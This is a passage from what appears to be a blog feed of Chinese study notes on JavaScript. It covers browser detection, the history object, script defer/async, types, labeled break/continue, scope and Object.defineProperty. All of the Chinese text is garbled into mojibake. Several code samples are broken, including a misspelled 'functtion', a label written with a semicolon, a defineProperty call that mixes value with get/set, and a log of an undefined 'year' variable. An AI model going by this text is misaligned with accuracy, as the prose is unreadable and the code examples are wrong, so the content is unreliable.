class="string">'Safari'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Chrome"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"Safari"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Chrome'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!!<span class="built_in">window</span>.ActiveXObject || <span class="string">"ActiveXObject"</span> <span class="keyword">in</span> <span class="built_in">window</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'IE&gt;=11'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Unkonwn'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-screen"><a href="#7-screen" class="headerlink" title="7. screen"></a>7. screen</h3><p>è¡¨ç¤ºæµè§ˆå™¨çª—å£å¤–éƒ¨çš„æ˜¾ç¤ºå™¨çš„ä¿¡æ¯ï¼Œå¦‚åƒç´ å®½é«˜ã€‚<br><br></p><h3 id="8-history"><a href="#8-history" class="headerlink" title="8. history"></a>8. history</h3><p><code>history</code>å¯¹è±¡ä¿å­˜ç€ç”¨æˆ·ä¸Šç½‘çš„å†å²è®°å½•ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå¼€å‘äººå‘˜æ— æ³•å¾—çŸ¥ç”¨æˆ·æµè§ˆè¿‡çš„URLã€‚ä½†æ˜¯ä½¿ç”¨<code>go()</code>æ–¹æ³•å¯ä»¥åœ¨ç”¨æˆ·çš„å†å²è®°å½•ä¸­ä»»æ„è·³è½¬ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">history.go(<span class="number">-1</span>);   <span class="comment">// åé€€ä¸€é¡µ</span></span><br><span class="line">history.go(<span class="number">1</span>);    <span class="comment">// å‰è¿›ä¸€é¡µ</span></span><br><span class="line">history.go(<span class="number">2</span>);    <span class="comment">// å‰è¿›ä¸¤é¡µ</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// è·³è½¬åˆ°å†å²è®°å½•ä¸­ æœ€è¿‘çš„ åŒ…å«æ”¹å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå¯èƒ½å‰è¿›å¯èƒ½åé€€</span></span><br><span class="line">history.go(<span class="string">"wrox.com"</span>)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-å…¶ä»–"><a href="#6-å…¶ä»–" class="headerlink" title="6. å…¶ä»–"></a>6. å…¶ä»–</h3><ul><li>setTimeout, clearTimeout</li><li>setInterval, clearInterval</li><li>ç³»ç»Ÿå¯¹è¯æ¡† alert(), confirm(), prompt()</li><li>æ˜¾ç¤ºæ‰“å°å¯¹è¯æ¡† window.print()</li><li>æ˜¾ç¤ºæŸ¥æ‰¾å¯¹è¯æ¡† window.find()</li><li>å¯èƒ½è¢«æµè§ˆå™¨ç¦ç”¨çš„æ–¹æ³•<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.moveTo(0, 0)         å°†çª—å£ç§»åŠ¨åˆ°å±å¹•å·¦ä¸Šè§’</span><br><span class="line">window.moveBy(0, 100)       å°†çª—å£å‘ä¸‹ç§»åŠ¨100åƒç´ </span><br><span class="line">window.resizeTo(100, 100)   å°†çª—å£è°ƒæ•´åˆ°100 * 100</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li>ã€ŠJavscripté«˜çº§ç¨‹åºè®¾è®¡ã€‹ ç¬¬å…«ç«  BOM</li><li>ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹ç¬¬ä¹ç«  å®¢æˆ·ç«¯ç›‘æµ‹</li><li><a href="https://segmentfault.com/a/1190000007640795" target="_blank" rel="noopener">JS è·å¾—æµè§ˆå™¨ç±»å‹å’Œç‰ˆæœ¬</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹</title>
      <link href="/2019/02/26/%E3%80%8AJavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B/"/>
      <url>/2019/02/26/%E3%80%8AJavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-script"><a href="#1-script" class="headerlink" title="1. script"></a>1. script</h3><p><em><code>&lt;script&gt;</code></em>çš„6ä¸ªå±æ€§ï¼šasync, charset, defer, language, src, type<br>ä¸è§£æåµŒå…¥å¼Javascriptä»£ç ä¸€æ ·ï¼Œåœ¨è§£æå¤–éƒ¨Javascriptæ–‡ä»¶æ—¶(åŒ…æ‹¬ä¸‹è½½æ–‡ä»¶)ï¼Œé¡µé¢çš„å¤„ç†ä¼šæš‚æ—¶åœæ­¢ã€‚æ— è®ºå¦‚ä½•åŒ…å«ä»£ç ï¼Œåªè¦ä¸å­˜åœ¨deferå’Œasyncå±æ€§ï¼Œæµè§ˆå™¨éƒ½ä¼šæŒ‰ç…§<code>&lt;script&gt;</code>å…ƒç´ åœ¨é¡µé¢ä¸­å‡ºç°çš„å…ˆåé¡ºåºå¯¹å®ƒä¾æ¬¡è¿›è¡Œè§£æã€‚ç¬¬ä¸€ä¸ªscriptå…ƒç´ åŒ…å«çš„ä»£ç è§£æå®Œåï¼Œç¬¬äºŒä¸ªæ‰ä¼šè¢«è§£æã€‚</p><p><em>å»¶è¿Ÿè„šæœ¬</em><br>è„šæœ¬ä¼šè¢«å»¶è¿Ÿåˆ°æ•´ä¸ªé¡µé¢éƒ½è§£æå®Œæ¯•åå†è¿è¡Œã€‚deferå±æ€§åªé€‚ç”¨äºå¤–éƒ¨æ–‡ä»¶ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">â€text/javascriptâ€defer</span>=<span class="string">â€deferâ€src</span>=<span class="string">â€example.jsâ€</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><em>å¼‚æ­¥è„šæœ¬</em><br>asyncåªé€‚ç”¨äºå¤–éƒ¨æ–‡ä»¶ã€‚æŒ‡å®šasyncçš„ç›®çš„æ˜¯ä¸è®©é¡µé¢ç­‰å¾…ä¸¤ä¸ªè„šæœ¬ä¸‹è½½å’Œæ‰§è¡Œï¼Œä»è€Œå¼‚æ­¥åŠ è½½é¡µé¢å…¶ä»–å†…å®¹ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">â€text/javascriptâ€</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">â€example.jsâ€</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-åŸºæœ¬æ¦‚å¿µ"><a href="#2-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="2.åŸºæœ¬æ¦‚å¿µ"></a>2.åŸºæœ¬æ¦‚å¿µ</h3><p>JSçš„å˜é‡æ˜¯æ¾æ•£ç±»å‹çš„ï¼Œæ‰€è°“æ¾æ•£ç±»å‹å°±æ˜¯å¯ä»¥ç”¨æ¥ä¿å­˜ä»»ä½•ç±»å‹çš„æ•°æ®ã€‚æ¢å¥è¯è¯´ï¼Œæ¯ä¸ªå˜é‡ä»…ä»…æ˜¯ä¸€ä¸ªç”¨äºä¿å­˜å€¼å¾—å ä½ç¬¦ã€‚<code>var message</code>æœªç»åˆå§‹åŒ–çš„å˜é‡ï¼Œä¼šä¿å­˜ä¸€ä¸ªç‰¹æ®Šçš„å€¼â€”â€”undefinedã€‚ç”¨varæ“ä½œç¬¦å®šä¹‰çš„å˜é‡ä¼šæˆä¸ºå®šä¹‰æ”¹å˜é‡çš„ä½œç”¨åŸŸä¸­çš„å±€éƒ¨å˜é‡ã€‚å¦‚æœåœ¨å‡½æ•°ä¸­ä½¿ç”¨varå®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡åœ¨å‡½æ•°é€€å‡ºåä¼šè¢«é”€æ¯ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="string">"Hi"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line">alert(message);  <span class="comment">// é”™è¯¯</span></span><br></pre></td></tr></table></figure></p><p><em>typeof</em><br>æ£€æŸ¥å˜é‡çš„æ•°æ®ç±»å‹ï¼Œè¿”å›Undefined, boolean, string, number, object, function</p><p><em>instanceof</em><br>å¦‚æœå˜é‡æ˜¯ç»™å®šå¼•ç”¨ç±»å‹çš„å®ä¾‹ï¼ˆæ ¹æ®åŸå‹é“¾è¯†åˆ«ï¼‰ï¼Œé‚£ä¹ˆinstanceofä¼šè¿”å›true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(person instanceof Object)  // å˜é‡personæ˜¯Objectå—ï¼Ÿ </span><br><span class="line">alert(colors instanceof Array)   // å˜é‡colorsæ˜¯Arrayå—ï¼Ÿ</span><br></pre></td></tr></table></figure></p><p><em>boolean</em><br>å¯¹ä»»ä½•æ•°æ®ç±»å‹å€¼è°ƒç”¨Boolean()å‡½æ•°ï¼Œæ€»æ˜¯ä¼šè¿”å›ä¸€ä¸ªbooleanå€¼ã€‚</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th style="text-align:center">è½¬æ¢ä¸ºtrueçš„å€¼</th><th style="text-align:right">è½¬æ¢ä¸ºfalseçš„å€¼</th></tr></thead><tbody><tr><td>Boolean</td><td style="text-align:center">true</td><td style="text-align:right">false</td></tr><tr><td>String</td><td style="text-align:center">ä»»ä½•éç©ºå­—ç¬¦ä¸²</td><td style="text-align:right">â€œâ€(ç©ºå­—ç¬¦ä¸²)</td></tr><tr><td>Number</td><td style="text-align:center">ä»»ä½•éé›¶æ•°å­—å€¼(åŒ…æ‹¬æ— ç©·å¤§)</td><td style="text-align:right">0å’ŒNaN</td></tr><tr><td>Object</td><td style="text-align:center">ä»»ä½•å¯¹è±¡</td><td style="text-align:right">null</td></tr><tr><td>Undefined</td><td style="text-align:center">n/a</td><td style="text-align:right">undefined</td></tr></tbody></table><p><em>NaN</em><br>ç¡®å®šè¿™ä¸ªå‚æ•°æ˜¯å¦â€œä¸æ˜¯æ•°å€¼â€<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">isNaN(NaN)     // true</span><br><span class="line">isNaN(10)      // false</span><br><span class="line">isNaN(&quot;10&quot;)    // false</span><br><span class="line">isNaN(&quot;blue&quot;)  // true</span><br><span class="line">isNaN(true)    // false(å¯ä»¥è½¬æ¢ä¸ºæ•°å€¼1)</span><br></pre></td></tr></table></figure></p><p><em>æ•°å€¼è½¬æ¢</em><br>parseInt: å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯æ•°å­—å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚æ— æ³•è§£æè¿”å›NaN<br>parseFloat: ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹è§£æï¼Œç›´åˆ°é‡è§ä¸€ä¸ªæ— æ•ˆçš„æµ®ç‚¹æ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚</p><p><em>é€€å‡ºå¾ªç¯</em><br><code>break</code>ä¼šç«‹å³é€€å‡ºå¾ªç¯ï¼Œå¼ºåˆ¶ç»§ç»­æ‰§è¡Œå¾ªç¯åé¢çš„è¯­å¥ã€‚<br><code>continue</code>ä¼šç«‹å³é€€å‡ºå¾ªç¯ï¼Œä½†é€€å‡ºå¾ªç¯åä¼šä»å¾ªç¯çš„é¡¶éƒ¨ç»§ç»­æ‰§è¡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">    <span class="comment">// continue;</span></span><br><span class="line">  &#125;</span><br><span class="line">  num++;</span><br><span class="line">&#125;</span><br><span class="line">alert(num); <span class="comment">// break: 4</span></span><br><span class="line">alert(num); <span class="comment">// continue: 8</span></span><br></pre></td></tr></table></figure></p><p>breakå’Œcontinueéƒ½å¯ä»¥ä¸labelè¯­å¥è”åˆä½¿ç”¨ï¼Œä»è€Œè¿”å›ä»£ç ä¸­ç‰¹å®šçš„ä½ç½®ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">outermost;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">5</span> &amp;&amp; j == <span class="number">5</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span> outermost;</span><br><span class="line">      <span class="comment">// continue outermost;</span></span><br><span class="line">    &#125;</span><br><span class="line">    num++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(num); <span class="comment">// break: 55ï¼Œbreakä¸ä»…ä¼šé€€å‡ºjå¾ªç¯ï¼Œè¿˜ä¼šé€€å‡ºiå¾ªç¯</span></span><br><span class="line">alert(num); <span class="comment">// continue: 95, continueé€€å‡ºå†…éƒ¨å¾ªç¯ï¼Œæ‰§è¡Œå¤–éƒ¨å¾ªç¯ï¼Œi=5,j=6~10ä¸ä¼šè¢«æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="3-å˜é‡ã€ä½œç”¨åŸŸå’Œå†…å­˜é—®é¢˜"><a href="#3-å˜é‡ã€ä½œç”¨åŸŸå’Œå†…å­˜é—®é¢˜" class="headerlink" title="3.å˜é‡ã€ä½œç”¨åŸŸå’Œå†…å­˜é—®é¢˜"></a>3.å˜é‡ã€ä½œç”¨åŸŸå’Œå†…å­˜é—®é¢˜</h3><p>Undefined, Null, Boolean, Number, Stringè¿™5ç§åŸºæœ¬æ•°æ®ç±»å‹æ˜¯æŒ‰å€¼è®¿é—®ï¼Œå¯ä»¥æ“ä½œåœ¨å˜é‡ä¸­å®é™…çš„å€¼ã€‚å¼•ç”¨ç±»å‹çš„å€¼æ˜¯æŒ‰å¼•ç”¨è®¿é—®çš„ã€‚</p><p><br></p><h4 id="3-1-å¤åˆ¶å˜é‡å€¼"><a href="#3-1-å¤åˆ¶å˜é‡å€¼" class="headerlink" title="3.1 å¤åˆ¶å˜é‡å€¼"></a>3.1 å¤åˆ¶å˜é‡å€¼</h4><ul><li>å¤åˆ¶ä¸€ä¸ªåŸºæœ¬ç±»å‹çš„å€¼ï¼Œä¼šåœ¨å˜é‡å¯¹è±¡ä¸Šåˆ›å»ºä¸€ä¸ªæ–°å€¼ï¼Œç„¶åæŠŠè¯¥å€¼å¤åˆ¶åˆ°ä½æ–°å˜é‡åˆ†é…çš„ä½ç½®ä¸Šã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var num1 = 5;</span><br><span class="line">var num2 = num1;</span><br><span class="line">// num1ä¸­çš„5å’Œnum2ä¸­çš„5æ˜¯å®Œå…¨ç‹¬ç«‹çš„ã€‚ä¸¤ä¸ªå˜é‡ä¸ä¼šç›¸äº’å½±å“ã€‚</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/26/ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹/1.png" style="max-width:250px"><br><br></p><ul><li>å¤åˆ¶ä¸€ä¸ªå¼•ç”¨ç±»å‹çš„å€¼ï¼ŒåŒæ ·ä¼šå°†å­˜å‚¨åœ¨å˜é‡å¯¹è±¡ä¸­çš„å€¼å¤åˆ¶ä¸€ä»½æ”¾åˆ°æ–°å˜é‡åˆ†é…çš„ç©ºé—´ä¸­ã€‚ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªå€¼çš„å‰¯æœ¬å®é™…ä¸Šæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å­˜å‚¨åœ¨å †ä¸­çš„ä¸€ä¸ªå¯¹è±¡ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj1 = new Object();</span><br><span class="line">var obj2 = obj1;</span><br><span class="line">obj1.name = â€˜mikeâ€™;</span><br><span class="line">alert(obj2.name)  // â€˜mikeâ€™</span><br><span class="line">// å¤åˆ¶åï¼Œä¸¤ä¸ªå˜é‡å®é™…ä¸Šå°†å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ã€‚å› æ­¤ï¼Œæ”¹å˜å…¶ä¸­ä¸€ä¸ªå˜é‡ï¼Œå°±ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡ã€‚</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/26/ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹/2.png" style="max-width:400px"></p><p><br></p><h4 id="4-2-æ‰§è¡Œç¯å¢ƒä¸ä½œç”¨åŸŸ"><a href="#4-2-æ‰§è¡Œç¯å¢ƒä¸ä½œç”¨åŸŸ" class="headerlink" title="4.2 æ‰§è¡Œç¯å¢ƒä¸ä½œç”¨åŸŸ"></a>4.2 æ‰§è¡Œç¯å¢ƒä¸ä½œç”¨åŸŸ</h4><p>æ‰§è¡Œç¯å¢ƒå®šä¹‰äº†å˜é‡æˆ–å‡½æ•°æœ‰æƒè®¿é—®çš„æ•°æ®ã€‚æ¯ä¸ªæ‰§è¡Œç¯å¢ƒéƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å…³è”çš„<em>å˜é‡å¯¹è±¡</em>ï¼Œç¯å¢ƒä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¯¹è±¡ä¸­ã€‚è™½ç„¶æˆ‘ä»¬ç¼–å†™çš„ä»£ç æ— æ³•è®¿é—®è¿™ä¸ªå¯¹è±¡ï¼Œä½†è§£æå™¨åœ¨å¤„ç†æ•°æ®æ—¶ä¼šåœ¨åå°ä½¿ç”¨å®ƒã€‚</p><ul><li><p>å…¨å±€æ‰§è¡Œç¯å¢ƒ<br>åœ¨Webæµè§ˆå™¨ä¸­ï¼Œå…¨å±€æ‰§è¡Œç¯å¢ƒè¢«è®¤ä¸ºæ˜¯<code>window</code>å¯¹è±¡ã€‚</p></li><li><p>å‡½æ•°çš„æ‰§è¡Œç¯å¢ƒ<br>æ¯ä¸ªå‡½æ•°éƒ½æœ‰è‡ªå·±çš„<em>æ‰§è¡Œç¯å¢ƒ</em>ã€‚å½“æ‰§è¡Œæµè¿›å…¥ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œå‡½æ•°çš„ç¯å¢ƒå°±ä¼šè¢«æ¨å…¥ä¸€ä¸ªç¯å¢ƒæ ˆä¸­ã€‚åœ¨å‡½æ•°æ‰§è¡Œä¹‹åï¼Œæ ˆå°†å…¶ç¯å¢ƒå¼¹å‡ºï¼ŒæŠŠæ§åˆ¶æƒè¿”å›ç»™ä¹‹å‰çš„æ‰§è¡Œç¯å¢ƒã€‚</p></li></ul><p>å½“ä»£ç åœ¨ä¸€ä¸ªç¯å¢ƒä¸­æ‰§è¡Œæ—¶ï¼Œä¼šåˆ›å»ºå˜é‡å¯¹è±¡çš„ä¸€ä¸ª<em>ä½œç”¨åŸŸé“¾</em>ã€‚ä½œç”¨åŸŸé“¾çš„ç”¨é€”ï¼Œæ˜¯ä¿è¯å¯¹æ‰§è¡Œç¯å¢ƒæœ‰æƒè®¿é—®çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°çš„æœ‰åºè®¿é—®ã€‚å†…éƒ¨ç¯å¢ƒå¯ä»¥é€šè¿‡ä½œç”¨åŸŸé“¾è®¿é—®æ‰€æœ‰çš„å¤–éƒ¨ç¯å¢ƒï¼Œä½†å¤–éƒ¨ç¯å¢ƒä¸èƒ½è®¿é—®å†…éƒ¨ç¯å¢ƒä¸­çš„å˜é‡å’Œå‡½æ•°ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var color = &quot;blue&quot;;</span><br><span class="line">function changeColor()&#123;</span><br><span class="line">    var anotherColor = &quot;red&quot;;</span><br><span class="line">    function swapColors()&#123;</span><br><span class="line">        var tempColor = anotherColor;</span><br><span class="line">        anotherColor = color;</span><br><span class="line">        color = tempColor;</span><br><span class="line">        // è¿™é‡Œå¯ä»¥è®¿é—®colorã€anotherColorå’ŒtempColor </span><br><span class="line">    &#125;</span><br><span class="line">    // è¿™é‡Œå¯ä»¥è®¿é—®colorå’ŒanotherColorï¼Œä½†ä¸èƒ½è®¿é—®tempColor</span><br><span class="line">    swapColors();</span><br><span class="line">&#125;</span><br><span class="line">// è¿™é‡Œåªèƒ½è®¿é—®color changeColor();</span><br></pre></td></tr></table></figure></p><p><br><br><em>æ²¡æœ‰å—çº§ä½œç”¨åŸŸ</em><br>åœ¨å…¶ä»–ç±»Cçš„è¯­è¨€ä¸­ï¼Œç”±<code>{}</code>å°é—­çš„ä»£ç å—éƒ½æœ‰è‡ªå·±çš„ä½œç”¨åŸŸã€‚ä½†åœ¨JSä¸­ï¼Œ<code>if</code>è¯­å¥ä¸­çš„å˜é‡ç”Ÿå‘½ä¼šå°†å˜é‡æ·»åŠ åˆ°å½“å‰çš„æ‰§è¡Œç¯å¢ƒä¸­ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true)&#123;</span><br><span class="line">  var color = &quot;blue&quot;;</span><br><span class="line">&#125;</span><br><span class="line">alert(color);  // &quot;blue&quot;</span><br></pre></td></tr></table></figure></p><p>ç”±forè¯­å¥åˆ›å»ºçš„å˜é‡iå³ä½¿åœ¨forå¾ªç¯æ‰§è¡Œç»“æŸåï¼Œä¹Ÿä¾æ—§ä¼šå­˜åœ¨äºå¾ªç¯å¤–éƒ¨çš„æ‰§è¡Œç¯å¢ƒæ±‡æ€»ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">  doSomething(i);</span><br><span class="line">&#125;</span><br><span class="line">alert(i);  // 10</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-åˆ›å»ºå¯¹è±¡"><a href="#6-åˆ›å»ºå¯¹è±¡" class="headerlink" title="6. åˆ›å»ºå¯¹è±¡"></a>6. åˆ›å»ºå¯¹è±¡</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  year: <span class="number">2004</span>,</span><br><span class="line">  edition: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(book, <span class="string">'year'</span>, &#123;</span><br><span class="line">  configurable: <span class="literal">false</span>,  <span class="comment">// ä¸èƒ½ä»å¯¹è±¡ä¸­åˆ é™¤å±æ€§</span></span><br><span class="line">  enumerable: <span class="literal">true</span>,     <span class="comment">// å¯ä»¥é€šè¿‡for-inå¾ªç¯è¿”å›å±æ€§</span></span><br><span class="line">  writable: <span class="literal">false</span>,      <span class="comment">// åªè¯»ä¸å¯ä¿®æ”¹</span></span><br><span class="line">  value: <span class="string">'Nicholas'</span>,</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.year;   <span class="comment">// å½“jsä¸­è¯»å–åˆ°yearè¿™ä¸€å±æ€§ï¼Œå°±ä¼šè§¦å‘getterå‡½æ•°</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set: functtion(newValue)&#123;</span><br><span class="line">    <span class="comment">// å½“jsæ‰§è¡Œyear = newValue; å°±ä¼šè§¦å‘setterå‡½æ•°ã€‚é™¤äº†ä¿®æ”¹å€¼ï¼Œè¿˜å¯ä»¥åšä¸€äº›å…¶ä»–æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span> (newValue &gt; <span class="number">2004</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.year = newValue;   </span><br><span class="line">      <span class="keyword">this</span>.edition += newValue - <span class="number">2004</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–å±æ€§çš„å€¼</span></span><br><span class="line"><span class="keyword">var</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(book, <span class="string">'year'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(year.value);        <span class="comment">// 2004</span></span><br><span class="line"><span class="built_in">console</span>.log(year.configurable); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="6-1-æ„é€ å‡½æ•°"><a href="#6-1-æ„é€ å‡½æ•°" class="headerlink" title="6.1 æ„é€ å‡½æ•°"></a>6.1 æ„é€ å‡½æ•°</h4><p><code>new</code>ä¸€ä¸ªæ–°å®ä¾‹ä¼šç»å†ä»¥ä¸‹4ä¸ªæ­¥éª¤: åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼›å°†æ„é€ å‡½æ•°çš„ä½œç”¨åŸŸèµ‹ç»™æ–°å¯¹è±¡(thisæŒ‡å‘è¿™ä¸ªæ–°å¯¹è±¡); æ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„ä»£ç (ä¸ºè¿™ä¸ªæ–°å¯¹è±¡æ·»åŠ å±æ€§); è¿”å›æ–°å¯¹è±¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 